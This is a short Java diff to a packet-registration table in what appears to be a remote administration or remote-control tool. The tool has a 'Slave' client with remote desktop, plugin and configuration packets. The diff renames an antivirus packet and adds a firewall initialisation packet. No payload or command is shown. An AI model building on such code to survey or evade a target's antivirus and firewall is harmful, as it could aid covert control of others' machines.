@@ -80,7 +80,8 @@ public class IncomingPackets {
 		incomingPackets.put(/* "CONFIG" */(byte) 66, Packet66Config.class);
 		incomingPackets.put(/* "PLUGIN" */(byte) 67, Packet67LoadedPlugins.class);
 		incomingPackets.put(/* "QUICKDESKTOP" */(byte) 68, Packet68QuickDesktop.class);
-		incomingPackets.put((byte) 69, Packet69Antivirus.class);
+		incomingPackets.put((byte) 69, Packet69InitAntivirus.class);
+		incomingPackets.put((byte) 70, Packet70InitFirewall.class);
 	}
 
 	public static boolean execute(byte header, Slave slave) {
